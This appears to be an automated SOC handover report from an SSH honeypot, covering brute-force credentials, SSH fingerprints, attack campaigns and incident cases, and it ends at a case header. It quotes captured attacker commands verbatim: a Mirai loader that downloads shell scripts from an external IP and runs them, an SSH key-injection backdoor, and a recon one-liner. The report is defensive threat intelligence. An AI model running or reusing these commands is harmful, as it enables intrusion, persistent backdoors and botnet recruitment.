# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-25 |
| **Generated At** | 2026-09-25T21:17:59Z |
| **Shift Time** | 21:17 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **327** |
| Confirmed Threats | **280** |
| False Positives Filtered | **47** (14.4%) |
| Unique Attacker IPs | **105** |
| Countries of Origin | **35** |
| High Severity Cases | **189** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **138** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **258** |
| Unique Credential Pairs | **173** |
| Unique Usernames | **56** |
| Unique Passwords | **122** |
| Successful Auth Pairs | **216** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 99 |
| `345gs5662d34` | 40 |
| `admin` | 11 |
| `support` | 11 |
| `node` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 41 |
| `345gs5662d34` | 40 |
| `support` | 11 |
| `123456` | 8 |
| `admin` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 40 |
| `root` | `3245gs5662d34` | 14 |
| `support` | `support` | 11 |
| `root` | `` | 6 |
| `admin` | `admin` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin123` | `92.118.39.14` | 2026-09-25T14:55:10 |
| `postgres` | `postgrestest` | `10.0.0.73` | 2026-09-25T14:55:16 |
| `root` | `default` | `92.118.39.14` | 2026-09-25T14:57:34 |
| `telecomadmin` | `admintelecom` | `77.90.185.17` | 2026-09-25T14:59:47 |
| `root` | `letmein` | `92.118.39.14` | 2026-09-25T14:59:59 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-09-25T15:02:28 |
| `root` | `password` | `92.118.39.14` | 2026-09-25T15:04:42 |
| `root` | `qwerty` | `92.118.39.14` | 2026-09-25T15:06:51 |
| `vas` | `123456` | `95.85.226.199` | 2026-09-25T15:07:21 |
| `345gs5662d34` | `345gs5662d34` | `95.85.226.199` | 2026-09-25T15:07:24 |
| `vas` | `3245gs5662d34` | `95.85.226.199` | 2026-09-25T15:07:24 |
| `root` | `joe` | `4.221.162.168` | 2026-09-25T15:07:25 |
| `345gs5662d34` | `345gs5662d34` | `4.221.162.168` | 2026-09-25T15:07:29 |
| `root` | `3245gs5662d34` | `4.221.162.168` | 2026-09-25T15:07:31 |
| `daveo` | `daveo` | `211.105.129.57` | 2026-09-25T15:09:35 |
| `345gs5662d34` | `345gs5662d34` | `211.105.129.57` | 2026-09-25T15:09:38 |
| `daveo` | `3245gs5662d34` | `211.105.129.57` | 2026-09-25T15:09:39 |
| `root` | `system` | `92.118.39.14` | 2026-09-25T15:11:09 |
| `root` | `toor` | `92.118.39.14` | 2026-09-25T15:13:20 |
| `admin` | `111111` | `92.118.39.14` | 2026-09-25T15:15:34 |
| `admin` | `123123` | `92.118.39.14` | 2026-09-25T15:17:40 |
| `manager` | `123` | `41.221.49.85` | 2026-09-25T15:37:39 |
| `345gs5662d34` | `345gs5662d34` | `41.221.49.85` | 2026-09-25T15:37:43 |
| `manager` | `3245gs5662d34` | `41.221.49.85` | 2026-09-25T15:37:45 |
| `exit` | `exit` | `20.243.208.191` | 2026-09-25T15:47:00 |
| `345gs5662d34` | `345gs5662d34` | `20.243.208.191` | 2026-09-25T15:47:03 |
| `exit` | `3245gs5662d34` | `20.243.208.191` | 2026-09-25T15:47:04 |
| `support` | `support` | `176.53.159.196` | 2026-09-25T15:53:51 |
| `support` | `support` | `10.0.0.73` | 2026-09-25T16:18:54 |
| `xmeta` | `xmeta` | `10.0.0.73` | 2026-09-25T16:45:39 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-25T16:45:43 |
| `xmeta` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T16:45:45 |
| `root` | `Abc123...` | `10.0.0.73` | 2026-09-25T16:55:25 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T16:55:31 |
| `deployer` | `deployer!` | `10.0.0.73` | 2026-09-25T16:58:33 |
| `deployer` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T16:58:39 |
| `root` | `As12345678` | `10.0.0.73` | 2026-09-25T16:58:54 |
| `root` | `qwer123456.` | `10.0.0.73` | 2026-09-25T17:00:28 |
| `ruslan` | `ruslan123` | `10.0.0.73` | 2026-09-25T17:02:30 |
| `ruslan` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T17:02:36 |
| `jane` | `jane` | `130.131.220.95` | 2026-09-25T17:06:38 |
| `345gs5662d34` | `345gs5662d34` | `130.131.220.95` | 2026-09-25T17:06:40 |
| `jane` | `3245gs5662d34` | `130.131.220.95` | 2026-09-25T17:06:40 |
| `support` | `support` | `140.186.88.135` | 2026-09-25T17:07:39 |
| `repro` | `repro123` | `201.71.192.108` | 2026-09-25T17:12:28 |
| `345gs5662d34` | `345gs5662d34` | `201.71.192.108` | 2026-09-25T17:12:31 |
| `repro` | `3245gs5662d34` | `201.71.192.108` | 2026-09-25T17:12:31 |
| `root` | `` | `94.154.43.69` | 2026-09-25T17:18:52 |
| `root` | `520131411` | `198.98.62.211` | 2026-09-25T17:29:52 |
| `345gs5662d34` | `345gs5662d34` | `198.98.62.211` | 2026-09-25T17:29:53 |
| `root` | `3245gs5662d34` | `198.98.62.211` | 2026-09-25T17:29:53 |
| `deploy` | `1` | `187.95.46.100` | 2026-09-25T17:34:20 |
| `sol` | `sol` | `2.57.122.238` | 2026-09-25T17:42:29 |
| `admin` | `admin` | `77.90.185.17` | 2026-09-25T17:43:36 |
| `solana` | `solana` | `2.57.122.238` | 2026-09-25T17:44:14 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-25T17:45:21 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-09-25T17:45:54 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-09-25T17:47:32 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-09-25T17:49:08 |
| `cdsmgr` | `cdsmgr` | `10.0.0.73` | 2026-09-25T17:49:55 |
| `cdsmgr` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T17:50:00 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-09-25T17:50:46 |
| `user` | `222` | `10.0.0.73` | 2026-09-25T17:51:21 |
| `user` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T17:51:25 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-09-25T17:52:20 |
| `node` | `node` | `2.57.122.238` | 2026-09-25T17:53:52 |
| `node` | `1234` | `2.57.122.238` | 2026-09-25T17:55:28 |
| `root` | `P@assw0rd` | `10.0.0.73` | 2026-09-25T17:55:53 |
| `demo` | `test` | `10.0.0.73` | 2026-09-25T17:55:57 |
| `demo` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T17:56:01 |
| `node` | `123456` | `2.57.122.238` | 2026-09-25T17:57:09 |
| `root` | `passw0rd.123` | `10.0.0.73` | 2026-09-25T17:58:43 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-09-25T17:58:48 |
| `eth` | `eth` | `2.57.122.238` | 2026-09-25T18:00:28 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-09-25T18:02:10 |
| `tron` | `tron` | `2.57.122.238` | 2026-09-25T18:03:49 |
| `trx` | `trx` | `2.57.122.238` | 2026-09-25T18:05:24 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-09-25T18:06:58 |
| `root` | `` | `93.170.46.6` | 2026-09-25T18:07:15 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-09-25T18:08:36 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-09-25T18:10:15 |
| `solv` | `solv` | `2.57.122.238` | 2026-09-25T18:11:52 |
| `solv` | `1234` | `2.57.122.238` | 2026-09-25T18:13:36 |
| `solv` | `123456` | `2.57.122.238` | 2026-09-25T18:15:23 |
| `solv` | `12345678` | `2.57.122.238` | 2026-09-25T18:17:05 |
| `michael` | `michael123` | `103.163.118.115` | 2026-09-25T18:20:14 |
| `345gs5662d34` | `345gs5662d34` | `103.163.118.115` | 2026-09-25T18:20:18 |
| `michael` | `3245gs5662d34` | `103.163.118.115` | 2026-09-25T18:20:20 |
| `root` | `111111` | `92.118.39.71` | 2026-09-25T18:20:30 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-09-25T18:21:59 |
| `root` | `123` | `92.118.39.71` | 2026-09-25T18:22:27 |
| `root` | `q!w@e#r$t%y^u&i*` | `149.34.48.31` | 2026-09-25T18:23:12 |
| `345gs5662d34` | `345gs5662d34` | `149.34.48.31` | 2026-09-25T18:23:15 |
| `root` | `3245gs5662d34` | `149.34.48.31` | 2026-09-25T18:23:15 |
| `validator` | `validator` | `2.57.122.238` | 2026-09-25T18:23:37 |
| `root` | `123123` | `92.118.39.71` | 2026-09-25T18:24:21 |
| `sol` | `sol123` | `2.57.122.238` | 2026-09-25T18:25:12 |
| `root` | `123321` | `92.118.39.71` | 2026-09-25T18:26:11 |
| `sol` | `123` | `2.57.122.238` | 2026-09-25T18:26:54 |
| `root` | `1234` | `92.118.39.71` | 2026-09-25T18:28:04 |
| `sol` | `12345678` | `2.57.122.238` | 2026-09-25T18:28:42 |
| `root` | `12345` | `92.118.39.71` | 2026-09-25T18:29:53 |
| `trading` | `trading` | `2.57.122.238` | 2026-09-25T18:30:27 |
| `trader` | `trader` | `2.57.122.238` | 2026-09-25T18:32:06 |
| `root` | `1234567` | `92.118.39.71` | 2026-09-25T18:33:29 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-09-25T18:33:47 |
| `root` | `12345678` | `92.118.39.71` | 2026-09-25T18:35:20 |
| `bot` | `bot` | `2.57.122.238` | 2026-09-25T18:35:28 |
| `bot` | `123456` | `2.57.122.238` | 2026-09-25T18:37:05 |
| `root` | `123456789` | `92.118.39.71` | 2026-09-25T18:37:11 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `107.150.105.104` | 2026-09-25T18:38:16 |
| `b'\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03'` | `github.com PGET / HTTP/1.0` | `107.150.105.104` | 2026-09-25T18:38:35 |
| `bot` | `12345` | `2.57.122.238` | 2026-09-25T18:38:41 |
| `root` | `1234abcd` | `92.118.39.71` | 2026-09-25T18:39:06 |
| `root` | `123abc` | `92.118.39.71` | 2026-09-25T18:41:04 |
| `root` | `123qwe` | `92.118.39.71` | 2026-09-25T18:43:01 |
| `root` | `1q2w3e` | `92.118.39.71` | 2026-09-25T18:44:54 |
| `k8s` | `12345` | `10.0.0.73` | 2026-09-25T18:45:49 |
| `k8s` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T18:45:51 |
| `pal` | `pal` | `10.0.0.73` | 2026-09-25T18:46:42 |
| `pal` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T18:46:45 |
| `root` | `1q2w3e4r` | `92.118.39.71` | 2026-09-25T18:46:49 |
| `root` | `P455w0rd` | `10.0.0.73` | 2026-09-25T18:47:53 |
| `root` | `Passw0rd#` | `10.0.0.73` | 2026-09-25T18:48:13 |
| `root` | `1qaz2wsx` | `92.118.39.71` | 2026-09-25T18:48:44 |
| `admin` | `admin` | `157.245.220.50` | 2026-09-25T18:49:13 |
| `xiaolin` | `123456` | `10.0.0.73` | 2026-09-25T18:49:33 |
| `xiaolin` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T18:49:38 |
| `udin` | `udin` | `10.0.0.73` | 2026-09-25T18:49:43 |
| `udin` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T18:49:48 |
| `root` | `321` | `92.118.39.71` | 2026-09-25T18:50:38 |
| `admin` | `admin` | `69.12.166.128` | 2026-09-25T18:52:24 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-25T18:52:25 |
| `root` | `654321` | `92.118.39.71` | 2026-09-25T18:52:30 |
| `root` | `P@ssw0rd` | `92.118.39.71` | 2026-09-25T18:54:23 |
| `user` | `git1234` | `203.128.6.159` | 2026-09-25T18:54:50 |
| `345gs5662d34` | `345gs5662d34` | `203.128.6.159` | 2026-09-25T18:54:53 |
| `user` | `3245gs5662d34` | `203.128.6.159` | 2026-09-25T18:54:55 |
| `diego` | `123` | `103.70.40.36` | 2026-09-25T18:55:41 |
| `345gs5662d34` | `345gs5662d34` | `103.70.40.36` | 2026-09-25T18:55:46 |
| `diego` | `3245gs5662d34` | `103.70.40.36` | 2026-09-25T18:55:48 |
| `root` | `P@ssword` | `92.118.39.71` | 2026-09-25T18:56:12 |
| `max` | `12345678` | `85.133.193.72` | 2026-09-25T18:56:14 |
| `345gs5662d34` | `345gs5662d34` | `85.133.193.72` | 2026-09-25T18:56:18 |
| `max` | `3245gs5662d34` | `85.133.193.72` | 2026-09-25T18:56:19 |
| `root` | `Root123` | `92.118.39.71` | 2026-09-25T18:58:05 |
| `root` | `admin` | `92.118.39.71` | 2026-09-25T19:00:00 |
| `qwerty` | `123456` | `195.178.191.5` | 2026-09-25T19:01:40 |
| `345gs5662d34` | `345gs5662d34` | `195.178.191.5` | 2026-09-25T19:01:43 |
| `qwerty` | `3245gs5662d34` | `195.178.191.5` | 2026-09-25T19:01:44 |
| `root` | `admin123` | `92.118.39.71` | 2026-09-25T19:01:55 |
| `root` | `letmein` | `92.118.39.71` | 2026-09-25T19:03:43 |
| `root` | `pass` | `92.118.39.71` | 2026-09-25T19:05:36 |
| `root` | `passw0rd` | `92.118.39.71` | 2026-09-25T19:07:28 |
| `root` | `password` | `92.118.39.71` | 2026-09-25T19:09:22 |
| `mauro` | `mauro` | `10.0.0.73` | 2026-09-25T19:10:56 |
| `mauro` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T19:10:58 |
| `root` | `password1` | `92.118.39.71` | 2026-09-25T19:11:18 |
| `root` | `qwerty` | `92.118.39.71` | 2026-09-25T19:13:21 |
| `root` | `Cm123456` | `10.0.0.73` | 2026-09-25T19:14:50 |
| `root` | `r00t` | `92.118.39.71` | 2026-09-25T19:15:11 |
| `root` | `root!@#` | `92.118.39.71` | 2026-09-25T19:18:52 |
| `uat` | `uat` | `10.0.0.73` | 2026-09-25T19:18:55 |
| `root` | `root#123` | `92.118.39.71` | 2026-09-25T19:20:47 |
| `node` | `123` | `118.36.136.12` | 2026-09-25T19:22:04 |
| `345gs5662d34` | `345gs5662d34` | `118.36.136.12` | 2026-09-25T19:22:07 |
| `node` | `3245gs5662d34` | `118.36.136.12` | 2026-09-25T19:22:09 |
| `root` | `root0000` | `92.118.39.71` | 2026-09-25T19:22:46 |
| `root` | `root1111` | `92.118.39.71` | 2026-09-25T19:24:55 |
| `root` | `root123` | `92.118.39.71` | 2026-09-25T19:27:02 |
| `root` | `root1234` | `92.118.39.71` | 2026-09-25T19:28:57 |
| `root` | `root2024` | `92.118.39.71` | 2026-09-25T19:30:46 |
| `root` | `root2222` | `92.118.39.71` | 2026-09-25T19:32:37 |
| `root` | `root321` | `92.118.39.71` | 2026-09-25T19:34:29 |
| `root` | `root4444` | `92.118.39.71` | 2026-09-25T19:36:27 |
| `root` | `root5555` | `92.118.39.71` | 2026-09-25T19:38:29 |
| `sammy` | `test` | `121.227.152.171` | 2026-09-25T19:40:10 |
| `345gs5662d34` | `345gs5662d34` | `121.227.152.171` | 2026-09-25T19:40:14 |
| `sammy` | `3245gs5662d34` | `121.227.152.171` | 2026-09-25T19:40:16 |
| `root` | `root5678` | `92.118.39.71` | 2026-09-25T19:40:31 |
| `root` | `root6666` | `92.118.39.71` | 2026-09-25T19:42:35 |
| `root` | `root9999` | `92.118.39.71` | 2026-09-25T19:44:38 |
| `root` | `root@123` | `92.118.39.71` | 2026-09-25T19:46:27 |
| `root` | `rootaccess` | `92.118.39.71` | 2026-09-25T19:48:15 |
| `root` | `` | `189.37.69.12` | 2026-09-25T19:49:07 |
| `root` | `rootadmin` | `92.118.39.71` | 2026-09-25T19:50:04 |
| `root` | `rootme` | `92.118.39.71` | 2026-09-25T19:51:57 |
| `root` | `rootpass` | `92.118.39.71` | 2026-09-25T19:53:47 |
| `root` | `rootpw` | `92.118.39.71` | 2026-09-25T19:55:42 |
| `root` | `rootroot` | `92.118.39.71` | 2026-09-25T19:57:43 |
| `root` | `toor` | `92.118.39.71` | 2026-09-25T19:59:43 |
| `root` | `welcome` | `92.118.39.71` | 2026-09-25T20:01:41 |
| `admin` | `1234` | `92.118.39.71` | 2026-09-25T20:03:43 |
| `admin` | `12345` | `92.118.39.71` | 2026-09-25T20:05:41 |
| `admin` | `123456` | `92.118.39.71` | 2026-09-25T20:07:30 |
| `admin` | `123456789` | `92.118.39.71` | 2026-09-25T20:09:16 |
| `root` | `London123` | `41.173.43.34` | 2026-09-25T20:29:39 |
| `345gs5662d34` | `345gs5662d34` | `41.173.43.34` | 2026-09-25T20:29:43 |
| `root` | `3245gs5662d34` | `41.173.43.34` | 2026-09-25T20:29:45 |
| `bjorn` | `bjorn` | `189.149.254.122` | 2026-09-25T20:30:45 |
| `345gs5662d34` | `345gs5662d34` | `189.149.254.122` | 2026-09-25T20:30:47 |
| `bjorn` | `3245gs5662d34` | `189.149.254.122` | 2026-09-25T20:30:48 |
| `root` | `Anonymous@123` | `217.154.35.203` | 2026-09-25T20:30:58 |
| `345gs5662d34` | `345gs5662d34` | `217.154.35.203` | 2026-09-25T20:31:00 |
| `root` | `3245gs5662d34` | `217.154.35.203` | 2026-09-25T20:31:01 |
| `root` | `admin` | `203.55.81.1` | 2026-09-25T20:41:08 |
| `root` | `ch3cooh` | `222.107.156.227` | 2026-09-25T20:44:28 |
| `345gs5662d34` | `345gs5662d34` | `222.107.156.227` | 2026-09-25T20:44:32 |
| `root` | `3245gs5662d34` | `222.107.156.227` | 2026-09-25T20:44:33 |
| `root` | `Server2025!` | `201.16.238.49` | 2026-09-25T20:48:32 |
| `345gs5662d34` | `345gs5662d34` | `201.16.238.49` | 2026-09-25T20:48:41 |
| `root` | `3245gs5662d34` | `201.16.238.49` | 2026-09-25T20:48:43 |
| `eric` | `eric1234` | `217.154.234.6` | 2026-09-25T20:51:12 |
| `345gs5662d34` | `345gs5662d34` | `217.154.234.6` | 2026-09-25T20:51:14 |
| `eric` | `3245gs5662d34` | `217.154.234.6` | 2026-09-25T20:51:15 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.210.85` | 2026-09-25T20:54:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **327** |
| Sessions with Fingerprint | **20** |
| Unique HASSH Fingerprints | **20** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 113 |
| libssh | 74 |
| OpenSSH | 24 |
| Unknown | 1 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 71 | 27 |
| `2ec37a7cc8da...` | Mirai/variant | 68 | 2 |
| `16443846184e...` | Generic scanner | 37 | 3 |
| `a984ff804585...` | libssh-based | 5 | 1 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 71 | 27 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 68 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 37 | 3 | Generic scanner |
| `95420f9d932d...` | OpenSSH | 12 | 7 | — |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `390ffe68a68c...` | OpenSSH | 3 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 66 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 22 | 22 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1070, T1140, T1059.004` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`, `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `41.221.49.85`, `211.105.129.57`, `95.85.226.199`, `203.128.6.159`, `20.243.208.191`, `130.131.220.95`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/nokillbins/handshakebins.sh; busybox wget http://213.232.114.14/nokillbins/handshakebins.sh; curl -o handshakebins.sh http://213.232.114.14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114.14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114.14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *
```
Source IPs: `94.154.43.69`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **105** |
| Unique ASNs | **52** |
| High-Risk ASNs | **38** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 38 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS393406` | DigitalOcean, LLC | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS16735` | ALGAR TELECOM S/A | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS22927` | Telefonica de Argentina | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (184)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-374a4b1db1ad

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:55 |
| **Last Seen** | 2026-09-25 14:55 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:55:10` | `cowrie.login.success` |
| `2026-09-25 14:55:14` | `cowrie.session.params` |
| `2026-09-25 14:55:14` | `cowrie.command.input` |
| `2026-09-25 14:55:14` | `cowrie.command.input` |
| `2026-09-25 14:55:14` | `cowrie.command.input` |
| `2026-09-25 14:55:14` | `cowrie.command.input` |
| `2026-09-25 14:55:14` | `cowrie.command.input` |
| `2026-09-25 14:55:14` | `cowrie.command.success` |
| `2026-09-25 14:55:14` | `cowrie.command.input` |
| `2026-09-25 14:55:14` | `cowrie.command.input` |
| `2026-09-25 14:55:14` | `cowrie.command.input` |
| `2026-09-25 14:55:14` | `cowrie.command.input` |
| `2026-09-25 14:55:14` | `cowrie.log.closed` |
| `2026-09-25 14:55:14` | `cowrie.session.params` |
| `2026-09-25 14:55:14` | `cowrie.command.input` |
| `2026-09-25 14:55:15` | `cowrie.log.closed` |
| `2026-09-25 14:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6fcc6303178

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:57 |
| **Last Seen** | 2026-09-25 14:57 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:57:24` | `cowrie.session.connect` |
| `2026-09-25 14:57:26` | `cowrie.client.version` |
| `2026-09-25 14:57:26` | `cowrie.client.kex` |
| `2026-09-25 14:57:34` | `cowrie.login.success` |
| `2026-09-25 14:57:38` | `cowrie.session.params` |
| `2026-09-25 14:57:38` | `cowrie.command.input` |
| `2026-09-25 14:57:38` | `cowrie.command.input` |
| `2026-09-25 14:57:38` | `cowrie.command.input` |
| `2026-09-25 14:57:38` | `cowrie.command.input` |
| `2026-09-25 14:57:38` | `cowrie.command.input` |
| `2026-09-25 14:57:38` | `cowrie.command.success` |
| `2026-09-25 14:57:38` | `cowrie.command.input` |
| `2026-09-25 14:57:38` | `cowrie.command.input` |
| `2026-09-25 14:57:38` | `cowrie.command.input` |
| `2026-09-25 14:57:38` | `cowrie.command.input` |
| `2026-09-25 14:57:38` | `cowrie.log.closed` |
| `2026-09-25 14:57:42` | `cowrie.session.params` |
| `2026-09-25 14:57:42` | `cowrie.command.input` |
| `2026-09-25 14:57:44` | `cowrie.log.closed` |
| `2026-09-25 14:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d569b51782

